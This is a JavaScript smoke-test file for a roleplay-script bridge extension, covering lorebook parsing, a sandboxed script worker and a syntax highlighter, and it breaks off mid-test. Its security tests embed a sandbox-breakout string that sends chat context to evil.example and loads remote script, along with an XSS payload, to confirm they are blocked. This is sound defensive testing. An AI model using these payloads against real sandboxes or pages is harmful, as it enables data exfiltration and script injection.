// Functional smoke tests for the Janitor AI Script Bridge pure modules.
// Run: node tests/smoke.mjs   (or: npm test)
// These exercise the exact code shipped in the extension (imported via file URL).

import assert from 'node:assert/strict';
import { existsSync, readFileSync } from 'node:fs';

const SRC = new URL('../src/', import.meta.url).href;

const { runScript, buildWorkerSource } = await import(SRC + 'runner.js');
const { buildContext, snapshotSeeds, fieldDiff, CONTEXT_CHAR_FIELDS } = await import(SRC + 'context.js');
const { runLorebookEngine } = await import(SRC + 'lorebook-engine.js');
const { highlightJavaScript } = await import(SRC + 'code-editor.js');
const {
    normalizeJanitorEntry, looksLikeLorebook, extractLorebookEntries,
    normalizeSecondaryLogic, normalizeGroupMode, normalizePlacement, normalizePosition,
    compileRegexKey, placementToWIPosition, sanitizeGroupLabelsForST, WI_POSITION,
} = await import(SRC + 'janitor-format.js');

let passed = 0;
let failed = 0;
const pendingAsyncTests = [];

function test(name, fn) {
    try {
        fn();
        passed++;
        console.log(`  ok  ${name}`);
    } catch (error) {
        failed++;
        console.error(`FAIL  ${name}`);
        console.error(`      ${error?.message ?? error}`);
    }
}

async function testAsync(name, fn) {
    pendingAsyncTests.push((async () => {
        try {
            await fn();
            passed++;
            console.log(`  ok  ${name}`);
        } catch (error) {
            failed++;
            console.error(`FAIL  ${name}`);
            console.error(`      ${error?.message ?? error}`);
        }
    })());
}

console.log('— janitor-format.js —');

test('normalizeJanitorEntry: Janitor-native shape', () => {
    const record = normalizeJanitorEntry({
        name: 'Rain check', category: 'Weather', key: 'rain, storm',
        regexKeys: ['thunder[a-z]*'], keysecondary: ['umbrella'], secondary_logic: 'AND ANY',
        content: 'It rains.', probability: 80, minMessages: 5, order: 42,
        group: 'weather-events', groupWeight: 30, groupSelectionMode: 'Pick One',
        caseSensitive: true, matchWholeWords: false, active: true, depth: 4,
    });
    assert.equal(record.keys.join('|'), 'rain|storm');
    assert.equal(record.regexKeys.join('|'), 'thunder[a-z]*');
    assert.equal(record.secondary.join('|'), 'umbrella');
    assert.equal(record.secondaryLogic, 0); // AND_ANY
    assert.equal(record.probability, 80);
    assert.equal(record.minMessages, 5);
    assert.equal(record.order, 42);
    assert.deepEqual(record.groupLabels, ['weather-events']);
    assert.equal(record.groupWeight, 30);
    assert.equal(record.groupMode, 'weighted'); // "Pick One" → weighted random
    assert.equal(record.caseSensitive, true);
    assert.equal(record.active, true);
    assert.equal(record.depth, 4);
    assert.equal(record.entryName, 'Rain check');
    assert.equal(record.category, 'Weather');
});

test('normalizeJanitorEntry: exporter/ST-style shape', () => {
    const record = normalizeJanitorEntry({ key: ['fire'], content: 'Fire burns.', enabled: false, constant: true });
    assert.equal(record.keys.join('|'), 'fire');
    assert.equal(record.active, false);
    assert.equal(record.constant, true);
    assert.equal(record.probability, 100);
});

test('normalizeJanitorEntry: rejects empty records', () => {
    assert.equal(normalizeJanitorEntry({ name: 'no content' }), null);
    assert.equal(normalizeJanitorEntry('string'), null);
    assert.equal(normalizeJanitorEntry(null), null);
});

test('looksLikeLorebook: array / {entries} / {script} / negatives', () => {
    assert.equal(looksLikeLorebook([{ key: 'a', content: 'b' }]), true);
    assert.equal(looksLikeLorebook({ entries: [{ content: 'x' }] }), true);
    assert.equal(looksLikeLorebook({ script: [{ content: 'x' }] }), true);
    assert.equal(looksLikeLorebook([{ value: 'value-variant content' }]), true, 'value content-variant is recognized');
    assert.equal(looksLikeLorebook({ foo: 'bar' }), false);
    assert.equal(looksLikeLorebook([1, 2, 3]), false);
});

test('extractLorebookEntries: all wrappers', () => {
    assert.equal(extractLorebookEntries([{ key: 'a' }]).length, 1);
    assert.equal(extractLorebookEntries({ entries: [{ key: 'a' }] }).length, 1);
    assert.equal(extractLorebookEntries({ script: [{ key: 'a' }] }).length, 1);
    assert.equal(extractLorebookEntries({ nope: 1 }), null);
});

test('normalizeJanitorEntry: real Janitor export schema (90-entry sample)', () => {
    const record = normalizeJanitorEntry({
        activationMode: 'standard', activationScript: '', case_sensitive: false,
        category: 'other', comment: 'Real export entry', constant: false,
        content: 'Some content.', enabled: true, extensions: {}, groupWeight: 100,
        id: 1, inclusionGroupRaw: '', insertion_order: 100,
        key: ['titfucking', 'tittyfuck'], keyMatchPriority: false,
        keysecondary: [''], keysecondaryRaw: '', keysRaw: 'titfucking, tittyfuck',
        matchWholeWords: true, minMessages: 0, name: '', prioritizeInclusion: false,
        priority: 1, probability: 100, selectiveLogic: 0, tags: [],
        keywordsRaw: 'titfucking, tittyfuck',
    });
    // name is empty in real exports — comment carries the title
    assert.equal(record.entryName, 'Real export entry');
    assert.equal(record.keys.join('|'), 'titfucking|tittyfuck');
    // empty-string secondary keys are filtered
    assert.equal(record.secondary.length, 0);
    // numeric selectiveLogic passes through (0 = AND_ANY)
    assert.equal(record.secondaryLogic, 0);
    assert.equal(record.matchWholeWords, true);
    assert.equal(record.caseSensitive, false);
    assert.equal(record.order, 100);
    assert.equal(record.minMessages, 0);
    assert.equal(record.activationMode, 'standard');
});

test('normalizeSecondaryLogic: numeric enum passthrough', () => {
    assert.equal(normalizeSecondaryLogic(0), 0);
    assert.equal(normalizeSecondaryLogic(3), 3);
    assert.equal(normalizeSecondaryLogic('2'), 2);
    assert.equal(normalizeSecondaryLogic(7), null);
    assert.equal(normalizeSecondaryLogic('AND ANY'), 0);
});

test('normalizeSecondaryLogic: label variants', () => {
    assert.equal(normalizeSecondaryLogic('and_any'), 0);
    assert.equal(normalizeSecondaryLogic('NOT ALL'), 1);
    assert.equal(normalizeSecondaryLogic('NOT ANY'), 2);
    assert.equal(normalizeSecondaryLogic('AND ALL'), 3);
    assert.equal(normalizeSecondaryLogic('bogus'), null);
    assert.equal(normalizeSecondaryLogic(undefined), null);
});

test('normalizeJanitorEntry: inclusionGroupRaw is recognized as group', () => {
    const record = normalizeJanitorEntry({ key: ['x'], content: 'y', inclusionGroupRaw: 'coinflip' });
    assert.deepEqual(record.groupLabels, ['coinflip']);
});

test('normalizeGroupMode: variants', () => {
    assert.equal(normalizeGroupMode('Pick One'), 'weighted');
    assert.equal(normalizeGroupMode('WEIGHTED_RANDOM'), 'weighted');
    assert.equal(normalizeGroupMode('Select All'), 'all');
    assert.equal(normalizeGroupMode('true'), 'byOrder'); // "Use insertion order instead of weight"
    assert.equal(normalizeGroupMode('false'), 'weighted');
    assert.equal(normalizeGroupMode('insertion order'), 'byOrder');
    assert.equal(normalizeGroupMode(''), null);
});

test('normalizePlacement/normalizePosition: Janitor editor values', () => {
    assert.equal(normalizePlacement('Default'), 'default');
    assert.equal(normalizePlacement('Personality'), 'personality');
    assert.equal(normalizePlacement('Scenario'), 'scenario');
    assert.equal(normalizePlacement('Example msg'), 'example');
    assert.equal(normalizePlacement(''), 'default');
    assert.equal(normalizePosition('Before'), 'before');
    assert.equal(normalizePosition('After'), 'after');
    assert.equal(normalizePosition('Above'), 'before');
    assert.equal(normalizePosition('Below'), 'after');
    assert.equal(normalizePosition(''), null);
});

test('normalizeJanitorEntry: regex keys embedded in key list are split out', () => {
    const record = normalizeJanitorEntry({ key: ['plain', '/thunder[0-9]+/gi', 'storm'], content: 'x' });
    assert.deepEqual(record.keys, ['plain', 'storm']);
    assert.deepEqual(record.regexKeys, ['/thunder[0-9]+/gi']);
});

test('normalizeJanitorEntry: placement/position defaults + prioritizeInclusion mode', () => {
    const absent = normalizeJanitorEntry({ key: ['x'], content: 'y' });
    assert.equal(absent.placement, 'default');
    assert.equal(absent.position, null); // export omits it; converter treats as After
    assert.equal(absent.groupMode, 'weighted'); // Janitor default: weighted random per group

    const byOrder = normalizeJanitorEntry({ key: ['x'], content: 'y', prioritizeInclusion: true });
    assert.equal(byOrder.groupMode, 'byOrder');
    assert.equal(byOrder.keyMatchPriority, false);

    const explicit = normalizeJanitorEntry({ key: ['x'], content: 'y', placement: 'Example msg', position: 'Before' });
    assert.equal(explicit.placement, 'example');
    assert.equal(explicit.position, 'before');
});

test('compileRegexKey: /pat/flags, bare, invalid', () => {
    assert.ok(compileRegexKey('/thunder[0-9]/i', false));
    assert.ok(compileRegexKey('thunder[0-9]', true));
    assert.equal(compileRegexKey('([', false), null);
});

test('compileRegexKey: flags outside ST whitelist are dropped and reported', () => {
    // ST's parseRegexFromString only accepts [gimsuy] — 'd' would make ST treat
    // the whole key as literal text, so the bridge drops it with a warning.
    const details = {};
    const regex = compileRegexKey('/foo\\d/d', false, details);
    assert.ok(regex, 'regex still compiles');
    assert.equal(details.droppedFlags, 'd');
    assert.ok(regex.test('foo1'));

    const kept = {};
    assert.ok(compileRegexKey('/foo/gi', false, kept));
    assert.equal(kept.droppedFlags, undefined, 'supported flags are kept');
});

test('placementToWIPosition: full Janitor editor table', () => {
    assert.equal(placementToWIPosition('personality', 'before'), WI_POSITION.BEFORE);
    assert.equal(placementToWIPosition('personality', 'after'), WI_POSITION.AFTER);
    assert.equal(placementToWIPosition('example', 'before'), WI_POSITION.EM_TOP);
    assert.equal(placementToWIPosition('example', 'after'), WI_POSITION.EM_BOTTOM);
    // Default / Scenario / unknown → "after" (ST has no between-slot)
    assert.equal(placementToWIPosition('default', 'after'), WI_POSITION.AFTER);
    assert.equal(placementToWIPosition('scenario', 'before'), WI_POSITION.AFTER);
    assert.equal(placementToWIPosition('scenario', 'after'), WI_POSITION.AFTER);
    assert.equal(placementToWIPosition(null, null), WI_POSITION.AFTER);
    // Default placement with explicit Before → before
    assert.equal(placementToWIPosition('default', 'before'), WI_POSITION.AFTER, 'Default placement is always after personality');
});

test('sanitizeGroupLabelsForST: commas are replaced (ST splits groups on commas)', () => {
    const plain = sanitizeGroupLabelsForST(['weather', 'town']);
    assert.equal(plain.joined, 'weather, town');
    assert.equal(plain.changed, false);
    const commas = sanitizeGroupLabelsForST(['a,b', 'c']);
    assert.equal(commas.joined, 'a;b, c');
    assert.equal(commas.changed, true);
});

console.log('— context.js —');

const fakeCharacter = {
    name: 'Aria',
    // Janitor's `personality` maps to ST's "Description" block (user-verified).
    description: 'Brave knight.',
    personality: 'ST-native personality (not used by the Janitor facade)',
    scenario: 'A cold night.',
    mes_example: '<START>\n{{user}}: hi\n{{char}}: hello',
};

const coreChat = [
    { mes: 'greeting', is_user: false, send_date: '2026-01-01T10:00:00' },
    { mes: 'hello there', is_user: true, send_date: '2026-01-01T10:01:00' },
    { mes: 'welcome back', is_user: false, send_date: '2026-01-01T10:02:00' },
    { mes: 'how are you?', is_user: true, send_date: '2026-01-01T10:03:00' },
];

test('buildContext: Janitor API surface + full-chat window', () => {
    const context = buildContext(coreChat, fakeCharacter);
    assert.equal(context.character.name, 'Aria');
    assert.equal(context.character.chat_name, 'Aria');
    // Janitor personality ← ST Description
    assert.equal(context.character.personality, 'Brave knight.');
    assert.equal(context.character.scenario, 'A cold night.');
    assert.equal(context.character.example_dialogs, '<START>\n{{user}}: hi\n{{char}}: hello');
    assert.equal(context.chat.last_message, 'how are you?');
    assert.equal(context.chat.last_user_message, undefined, 'last_user_message does not exist on Janitor');
    assert.equal(context.chat.conversation_id, undefined, 'probed fields are not emulated');
    assert.equal(context.chat.message_count, 4);
    // No depth cap: scripts see the WHOLE chat (user-verified) and self-limit
    assert.equal(context.chat.last_messages.length, 4);
    assert.deepEqual(context.chat.last_messages[0], { is_bot: true, role: 'assistant', date: '2026-01-01T10:00:00', message: 'greeting' });
    assert.deepEqual(context.chat.last_messages[3], { is_bot: false, role: 'user', date: '2026-01-01T10:03:00', message: 'how are you?' });
    // JSON-pure (must survive worker round-trips)
    JSON.stringify(context);
});

test('snapshotSeeds + fieldDiff: append / replace / set', () => {
    const context = buildContext(coreChat, fakeCharacter);
    const seeds = snapshotSeeds(context);
    context.character.personality += ' Fearless.';
    context.character.scenario = 'A hot day.';
    assert.equal(fieldDiff(seeds.personality, context.character.personality), '+ appended: " Fearless."');
    assert.match(fieldDiff(seeds.scenario, context.character.scenario), /^~ replaced:/);
    assert.equal(fieldDiff('x', 'x'), null);
});

console.log('— lorebook-engine.js —');

const engineMessages = [
    { is_bot: true, role: 'assistant', message: 'The storm gathers over the hills.' },
    { is_bot: false, role: 'user', message: 'I walk through the rain.' },
    { is_bot: true, role: 'assistant', message: 'Lightning flashes. thunder99 hits the tower. thunder rolls on.' },
];

function runEngine(entries, { messages = engineMessages, rng = () => 0.5, bookDepth = 3 } = {}) {
    return runLorebookEngine({ entries, messages, messageCount: messages.length, bookDepth, rng });
}

test('engine: literal key with Janitor whole-word default', () => {
    const out = runEngine([
        { key: 'rain', content: 'RAIN-HIT' },
        { key: 'train', content: 'TRAIN-HIT' },
    ]);
    const text = out.blocks.personalityAfter;
    assert.match(text, /RAIN-HIT/);
    assert.doesNotMatch(text, /TRAIN-HIT/, '"rain" inside "training" must not match with whole words ON');
});

test('engine: whole-word OFF matches substrings', () => {
    const out = runEngine([
        { key: 'rain', content: 'SUBSTR-HIT', matchWholeWords: false },
    ]);
    // window has no "rain" as substring except in "rain."? Use a dedicated message
    const out2 = runLorebookEngine({
        entries: [{ key: 'storm', content: 'SUBSTR-HIT', matchWholeWords: false }],
        messages: [{ is_bot: true, message: 'sandstorms brew' }],
        messageCount: 1,
        rng: () => 0.5,
    });
    assert.match(out2.blocks.personalityAfter, /SUBSTR-HIT/, 'substring match when whole words OFF');
    void out;
});

test('engine: case sensitivity honored', () => {
    const insensitive = runEngine([{ key: 'Rain', content: 'CASE-INSENSITIVE' }]);
    assert.match(insensitive.blocks.personalityAfter, /CASE-INSENSITIVE/);
    const sensitive = runLorebookEngine({
        entries: [{ key: 'Rain', content: 'CASE-SENSITIVE-MISS', caseSensitive: true }],
        messages: [{ is_bot: true, message: 'the rain falls' }],
        messageCount: 1,
        rng: () => 0.5,
    });
    assert.equal(sensitive.blocks.personalityAfter, '', 'case-sensitive key must not match lowercase text');
});

test('engine: regex keys with flags', () => {
    const out = runEngine([{ key: ['/thunder[0-9]+/i'], content: 'REGEX-HIT' }]);
    assert.match(out.blocks.personalityAfter, /REGEX-HIT/);
    const miss = runEngine([{ key: ['/thunder[0-9]{5}/'], content: 'REGEX-MISS' }]);
    assert.equal(miss.blocks.personalityAfter, '');
});

test('engine: secondary logic modes (0 AND ANY / 1 NOT ALL / 2 NOT ANY / 3 AND ALL)', () => {
    const make = (logic, secondaries) => runEngine([
        { key: 'rain', keysecondary: secondaries, secondary_logic: logic, content: `SEC-${logic}` },
    ]);
    assert.equal(runEngine([{ key: 'rain', keysecondary: ['umbrella'], secondary_logic: 0, content: 'SEC0' }]).blocks.personalityAfter, '', 'AND ANY: no secondary match → inactive');
    assert.match(runEngine([{ key: 'rain', keysecondary: ['rain'], secondary_logic: 0, content: 'SEC0b' }]).blocks.personalityAfter, /SEC0b/);
    assert.match(runEngine([{ key: 'rain', keysecondary: ['umbrella', 'rain'], secondary_logic: 1, content: 'SEC1' }]).blocks.personalityAfter, /SEC1/, 'NOT ALL: one of two matched → active');
    assert.equal(runEngine([{ key: 'rain', keysecondary: ['rain'], secondary_logic: 1, content: 'SEC1b' }]).blocks.personalityAfter, '', 'NOT ALL: all matched → inactive');
    assert.match(runEngine([{ key: 'rain', keysecondary: ['umbrella'], secondary_logic: 2, content: 'SEC2' }]).blocks.personalityAfter, /SEC2/, 'NOT ANY: none matched → active');
    assert.equal(runEngine([{ key: 'rain', keysecondary: ['rain'], secondary_logic: 2, content: 'SEC2b' }]).blocks.personalityAfter, '', 'NOT ANY: one matched → inactive');
    assert.match(runEngine([{ key: 'rain', keysecondary: ['lightning', 'thunder'], secondary_logic: 3, content: 'SEC3' }]).blocks.personalityAfter, /SEC3/, 'AND ALL: both matched → active');
    assert.equal(make(3, ['lightning', 'umbrella']).blocks.personalityAfter, '', 'AND ALL: one missing → inactive');
});

test('engine: constant entries activate without keys', () => {
    const out = runEngine([{ constant: true, content: 'CONSTANT-HIT' }]);
    assert.match(out.blocks.personalityAfter, /CONSTANT-HIT/);
    const decision = out.decisions.find(d => d.activated);
    assert.match(decision.reason, /constant/i);
});

test('engine: disabled entries never activate', () => {
    const out = runEngine([{ key: 'rain', content: 'DISABLED', enabled: false }]);
    assert.equal(out.blocks.personalityAfter, '');
    assert.match(out.decisions[0].reason, /disabled/);
});

test('engine: keyless non-constant entries never activate', () => {
    const out = runEngine([{ content: 'NO-KEYS' }]);
    assert.equal(out.blocks.personalityAfter, '');
    assert.match(out.decisions[0].reason, /no keys/);
});

test('engine: Min Messages gates on total message count', () => {
    const below = runEngine([{ key: 'rain', content: 'MINMSG', minMessages: 10 }]);
    assert.equal(below.blocks.personalityAfter, '');
    assert.match(below.decisions[0].reason, /Min Messages \(3\/10\)/);
    const longChat = [...engineMessages, ...Array.from({ length: 8 }, (_, i) => ({ is_bot: i % 2 === 0, message: `filler ${i}` }))];
    const above = runLorebookEngine({ entries: [{ key: 'filler', content: 'MINMSG-OK', minMessages: 10 }], messages: longChat, messageCount: longChat.length, rng: () => 0.5 });
    assert.match(above.blocks.personalityAfter, /MINMSG-OK/);
});

test('engine: per-entry depth overrides the book depth', () => {
    // 'storm' appears only in the OLDEST message (depth 3) — entry depth 1 misses it.
    const miss = runEngine([{ key: 'storm', content: 'DEPTH-MISS', depth: 1 }]);
    assert.equal(miss.blocks.personalityAfter, '');
    const hit = runEngine([{ key: 'storm', content: 'DEPTH-HIT', depth: 3 }]);
    assert.match(hit.blocks.personalityAfter, /DEPTH-HIT/);
});

test('engine: probability rolls per run (injectable rng)', () => {
    const entries = [{ key: 'rain', content: 'PROB', probability: 50 }];
    const win = runEngine(entries, { rng: () => 0.1 });
    assert.match(win.blocks.personalityAfter, /PROB/, 'roll 10 < 50 → activates');
    const lose = runEngine(entries, { rng: () => 0.9 });
    assert.equal(lose.blocks.personalityAfter, '', 'roll 90 ≥ 50 → fails');
    assert.match(lose.decisions[0].reason, /probability/);
});

test('engine: weighted group roll picks ONE entry per group', () => {
    const entries = [
        { key: 'lightning', content: 'A-WEIGHT-75', inclusionGroupRaw: 'flip', groupWeight: 75 },
        { key: 'lightning', content: 'B-WEIGHT-25', inclusionGroupRaw: 'flip', groupWeight: 25 },
    ];
    const lowRoll = runEngine(entries, { rng: () => 0.0 });
    assert.match(lowRoll.blocks.personalityAfter, /A-WEIGHT-75/);
    assert.doesNotMatch(lowRoll.blocks.personalityAfter, /B-WEIGHT-25/);
    assert.match(lowRoll.decisions.find(d => d.entryName.startsWith('A')).reason, /won inclusion group/);
    assert.match(lowRoll.decisions.find(d => d.entryName.startsWith('B')).reason, /lost inclusion group/);
    const highRoll = runEngine(entries, { rng: () => 0.99 });
    assert.match(highRoll.blocks.personalityAfter, /B-WEIGHT-25/, 'roll 99 lands in B\'s 25-point band');
});

test('engine: prioritizeInclusion switches the group to insertion-order priority', () => {
    const entries = [
        { key: 'lightning', content: 'ORDER-80', inclusionGroupRaw: 'g', order: 80, prioritizeInclusion: true },
        { key: 'lightning', content: 'ORDER-50', inclusionGroupRaw: 'g', order: 50, prioritizeInclusion: true },
    ];
    const out = runEngine(entries, { rng: () => 0.0 }); // weighted would pick A (order 80, first band)
    assert.match(out.blocks.personalityAfter, /ORDER-50/, 'lowest insertion order wins regardless of rng');
    assert.doesNotMatch(out.blocks.personalityAfter, /ORDER-80/);
});

test('engine: entries outside groups are unaffected by group rolls', () => {
    const out = runEngine([
        { key: 'rain', content: 'FREE-ENTRY' },
        { key: 'lightning', content: 'G1', inclusionGroupRaw: 'x' },
        { key: 'lightning', content: 'G2', inclusionGroupRaw: 'x' },
    ], { rng: () => 0.0 });
    assert.match(out.blocks.personalityAfter, /FREE-ENTRY/);
});

test('engine: placement anchors (Default=after personality, Scenario, Example)', () => {
    const out = runEngine([
        { key: 'rain', content: 'AFTER-PERS', placement: 'Default' },
        { key: 'rain', content: 'BEFORE-SCEN', placement: 'Scenario', position: 'Before' },
        { key: 'rain', content: 'AFTER-EX', placement: 'Example msg' },
    ]);
    assert.match(out.blocks.personalityAfter, /AFTER-PERS/);
    assert.match(out.blocks.scenarioBefore, /BEFORE-SCEN/);
    assert.match(out.blocks.exampleAfter, /AFTER-EX/);
    assert.equal(out.blocks.personalityBefore, '');
    assert.equal(out.blocks.scenarioAfter, '');
});

test('engine: missing position defaults to After (Janitor editor default)', () => {
    const out = runEngine([{ key: 'rain', content: 'X', placement: 'Personality' }]);
    assert.match(out.blocks.personalityAfter, /X/);
});

test('engine: within-block ordering matches ST (higher order = closer to the anchor)', () => {
    const after = runEngine([
        { key: 'rain', content: 'AFTER-ORDER-100', order: 100 },
        { key: 'rain', content: 'AFTER-ORDER-50', order: 50 },
        { key: 'rain', content: 'AFTER-ORDER-75', order: 75 },
    ]);
    assert.equal(after.blocks.personalityAfter, 'AFTER-ORDER-50\nAFTER-ORDER-75\nAFTER-ORDER-100');

    const before = runEngine([
        { key: 'rain', content: 'BEFORE-ORDER-100', order: 100, placement: 'Personality', position: 'Before' },
        { key: 'rain', content: 'BEFORE-ORDER-50', order: 50, placement: 'Personality', position: 'Before' },
    ]);
    assert.equal(before.blocks.personalityBefore, 'BEFORE-ORDER-100\nBEFORE-ORDER-50');
});

test('engine: decisions stay in book entry order', () => {
    const out = runEngine([
        { key: 'nothing-here', content: 'MISS-FIRST' },
        { key: 'rain', content: 'HIT-SECOND' },
        { key: 'nothing-either', content: 'MISS-THIRD' },
    ]);
    assert.deepEqual(out.decisions.map(d => d.entryName), ['MISS-FIRST', 'HIT-SECOND', 'MISS-THIRD']);
});

console.log('— runner.js —');

const OFFICIAL_TEMPLATE = `
if (!context.character) context.character = {};
if (!context.character.personality) context.character.personality = "";
context.character.personality += "\\n\\nbecomes more relaxed around books";
context.character.scenario += "\\n\\nSunlight streams through tall windows.";
`;

/** Runs a script through the static worker source against a fake `self`. */
function simulateWorker(scriptCode, context) {
    let captured = null;
    const fakeSelf = { postMessage: payload => { captured = payload; } };
    new Function('self', buildWorkerSource())(fakeSelf);
    assert.equal(typeof fakeSelf.onmessage, 'function', 'worker source must install onmessage');
    fakeSelf.onmessage({ data: { scriptCode, contextJSON: JSON.stringify(context) } });
    return captured;
}

testAsync('runScript (inline fallback in Node): official Janitor template', async () => {
    const context = buildContext(coreChat, fakeCharacter);
    const result = await runScript(OFFICIAL_TEMPLATE, context, 500);
    assert.equal(result.ok, true, `expected ok, got error: ${result.error}`);
    assert.match(result.context.character.personality, /becomes more relaxed around books/);
    assert.match(result.context.character.scenario, /Sunlight/);
});

testAsync('worker source is static — no script code embedded', () => {
    const source = buildWorkerSource();
    assert.ok(source.includes('self.onmessage'), 'worker installs onmessage');
    assert.doesNotMatch(source, /becomes more relaxed/, 'no user code in the source');
    assert.ok(source.includes('new Function'), 'script is compiled inside the worker');
});

testAsync('worker source simulation: mutations + console capture', async () => {
    const context = buildContext(coreChat, fakeCharacter);
    const captured = simulateWorker(OFFICIAL_TEMPLATE + '\nconsole.log("dbg", 123);', context);
    assert.ok(captured, 'worker must post a payload');
    assert.equal(captured.ok, true, `expected ok, got: ${captured.error}`);
    const out = JSON.parse(captured.contextJSON);
    assert.match(out.character.personality, /becomes more relaxed/);
    assert.match(out.character.scenario, /Sunlight/);
    assert.equal(captured.logs.length, 1);
    assert.match(captured.logs[0], /dbg 123/);
});

testAsync('worker source simulation: script error is isolated', async () => {
    const context = buildContext(coreChat, fakeCharacter);
    const captured = simulateWorker('throw new Error("boom");', context);
    assert.equal(captured.ok, false);
    assert.match(captured.error, /boom/);
    // context unchanged
    const out = JSON.parse(captured.contextJSON);
    assert.equal(out.character.personality, 'Brave knight.');
});

testAsync('SECURITY: IIFE-breakout payload is a safe compile error', async () => {
    const context = buildContext(coreChat, fakeCharacter);
    // The old concatenation build let this run at worker TOP LEVEL, where the
    // real fetch/importScripts live. The new-Function build keeps it inside the
    // shadowed function body — `})();` is just a syntax error there.
    const breakout = '})(); fetch("https://evil.example/steal?d="+JSON.stringify(context)); importScripts("https://evil.example/x.js"); (function(){';
    const captured = simulateWorker(breakout, context);
    assert.equal(captured.ok, false, 'breakout must not succeed');
    assert.match(captured.error ?? '', /(syntax|unexpected|token|literal|parenthes)/i);
    // Whatever comes back must be the UNMUTATED input context (parse happens
    // before compile; the script body never ran) — nothing extra leaves.
    assert.deepEqual(JSON.parse(captured.contextJSON), context);
});

testAsync('SECURITY: host globals are unreachable from the script body', async () => {
    const context = buildContext(coreChat, fakeCharacter);
    const probe = `
        var probe = [];
        try { fetch("http://x"); probe.push("fetch-called"); } catch (e) { probe.push("fetch-blocked"); }
        try { setTimeout(function(){}, 0); probe.push("timeout-called"); } catch (e) { probe.push("timeout-blocked"); }
        try { document.title; probe.push("doc-used"); } catch (e) { probe.push("doc-blocked"); }
        try { importScripts("http://x"); probe.push("is-called"); } catch (e) { probe.push("is-blocked"); }
        try { Promise.resolve(); probe.push("promise-blocked"); } catch (e) { probe.push("promise-blocked-catch"); }
        context.chat.probe = probe.join(",");
    `;
    const captured = simulateWorker(probe, context);
    assert.equal(captured.ok, true, captured.error ?? '');
    const out = JSON.parse(captured.contextJSON);
    assert.match(out.chat.probe, /fetch-blocked/);
    assert.match(out.chat.probe, /timeout-blocked/);
    assert.match(out.chat.probe, /doc-blocked/);
    assert.match(out.chat.probe, /is-blocked/);
    assert.doesNotMatch(out.chat.probe, /called/);
});

testAsync('worker source simulation: async/await rejected like on Janitor', async () => {
    const context = buildContext(coreChat, fakeCharacter);
    const captured = simulateWorker(`
        context.character.personality += "never runs";
        await 1;
    `, context);
    assert.equal(captured.ok, false, 'script with await must not succeed');
    assert.match(captured.error ?? '', /(await|Syntax|Unexpected)/i);
    assert.doesNotMatch(JSON.stringify(captured.contextJSON ?? ''), /never runs/);
});

testAsync('runScript: backtick/`${}` heavy script survives (payload transport)', async () => {
    const code = 'context.character.personality += `tick ${1 + 1} ` + "done";';
    const context = buildContext(coreChat, fakeCharacter);
    const result = await runScript(code, context, 500);
    assert.equal(result.ok, true, result.error ?? '');
    assert.match(result.context.character.personality, /tick 2 done/);
});

testAsync('INTEGRATION: real Janitor showcase script (state engine) runs end-to-end', async () => {
    const SHOWCASE = 'C:/Users/Biede/Downloads/showcase.txt';
    if (!existsSync(SHOWCASE)) {
        console.log('      (showcase file not present — skipped)');
        return;
    }
    const code = readFileSync(SHOWCASE, 'utf8');

    // Build a chat where a previous bot reply carries a valid-looking state hash
    // anchor and the user just sent a trigger keyword.
    const anchorMsg = 'Phase report.\n[ ](#Save|SyncKey:12345|Hash:abcdefghijkl|Target:Eugene|Eval:VAL_P1)';
    const chat = [
        { mes: anchorMsg, is_user: false, send_date: '2026-01-01T10:00:00' },
        { mes: 'apple', is_user: true, send_date: '2026-01-01T10:01:00' },
    ];
    const context = buildContext(chat, fakeCharacter);
    const scenarioSeed = context.character.scenario;

    const result = await runScript(code, context, 2000);
    assert.equal(result.ok, true, `showcase script failed: ${result.error}`);
    // Engine appended its system prompt to scenario
    assert.notEqual(result.context.character.scenario, scenarioSeed);
    assert.match(result.context.character.scenario, /STATE TRACKING/);
    assert.match(result.context.character.scenario, /Hash:/);
    // The engine's debug console output was captured
    assert.ok(result.logs.some(line => line.includes('ENGINE DEBUG PANEL')), 'debug panel logs missing');
    // role field was consumed by the script (it filters assistant messages for the anchor)
    assert.ok(result.context.chat.last_message !== undefined);
});

testAsync('runScript: oversized script rejected', async () => {
    const context = buildContext(coreChat, fakeCharacter);
    const result = await runScript('var x = "' + 'a'.repeat(310 * 1024) + '";', context, 500);
    assert.equal(result.ok, false);
    assert.match(result.error, /limit/);
});

testAsync('runScript: non-numeric timeout falls back to a sane default', async () => {
    const context = buildContext(coreChat, fakeCharacter);
    // Hand-edited settings could carry NaN/undefined — must not instantly time out.
    const result = await runScript('context.character.personality += " ok";', context, NaN);
    assert.equal(result.ok, true, result.error ?? '');
    assert.match(result.context.character.personality, / ok$/);
});

console.log('— code-editor.js —');

test('highlightJavaScript: keywords, numbers, literals, calls', () => {
    const html = highlightJavaScript('const x = 1;\nif (x) foo(true, null); map.set(2);');
    assert.match(html, /<span class="jai-tok-keyword">const<\/span>/);
    assert.match(html, /<span class="jai-tok-keyword">if<\/span>/);
    assert.match(html, /<span class="jai-tok-number">1<\/span>/);
    assert.match(html, /<span class="jai-tok-number">2<\/span>/);
    assert.match(html, /<span class="jai-tok-literal">true<\/span>/);
    assert.match(html, /<span class="jai-tok-literal">null<\/span>/);
    assert.match(html, /<span class="jai-tok-function">foo<\/span>/);
    // .get( / .set( must color as calls, not as accessor keywords
    assert.match(html, /<span class="jai-tok-function">set<\/span>/);
    // plain identifiers stay unspanned
    assert.ok(!html.includes('jai-tok-"x"') && !/jai-tok-\w+">x<\/span>/.test(html));
});

test('highlightJavaScript: comments (line, block, unterminated)', () => {
    assert.match(highlightJavaScript('// hi'), /<span class="jai-tok-comment">\/\/ hi<\/span>/);
    assert.match(highlightJavaScript('/* multi\nline */'), /<span class="jai-tok-comment">\/\* multi\nline \*\/<\/span>/);
    assert.match(highlightJavaScript('/* open'), /<span class="jai-tok-comment">\/\* open<\/span>/);
});

test('highlightJavaScript: strings escape HTML-special characters', () => {
    const html = highlightJavaScript("const s = 'a<b>&c';");
    assert.match(html, /<span class="jai-tok-string">'a&lt;b&gt;&amp;c'<\/span>/);
});

test('highlightJavaScript: template string ${} embeds', () => {
    const html = highlightJavaScript('`a ${name} & b`');
    assert.match(html, /jai-tok-string">`a <span class="jai-tok-embed">\$\{name\}<\/span> &amp; b`<\/span>/);
});

test('highlightJavaScript: XSS payload is fully escaped', () => {
    const html = highlightJavaScript('</textarea><img src=x onerror=alert(1)><script>void</script>');
    assert.ok(!/[<]img|[<]script|[<]\/textarea/.test(html.replace(/&lt;/g, '<NEVER>')));
    assert.match(html, /&lt;\/textarea&gt;/);
    assert.match(html, /&lt;script&gt;/);
});

test('highlightJavaScript: whitespace preserved verbatim', () => {
